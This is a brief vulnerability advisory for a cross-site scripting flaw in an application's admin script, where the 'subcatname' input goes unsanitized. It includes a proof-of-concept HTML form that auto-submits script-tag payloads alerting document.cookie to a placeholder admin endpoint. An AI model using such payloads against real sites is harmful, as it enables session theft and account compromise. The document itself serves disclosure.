Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application.

The vulnerability exists due to failure in the "views/admin.php" script to properly sanitize user-supplied input in "subcatname" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/admin/forum/create_sub.html" method="post" name="main">
<input type="hidden" name="cat" value="1">
<input type="hidden" name="subcatname" value='subname"><script>alert(document.cookie)</script>'>
<input type="hidden" name="description" value='description"><script>alert(document.cookie)</script>'>
</form>
<script>
document.main.submit();
</script>
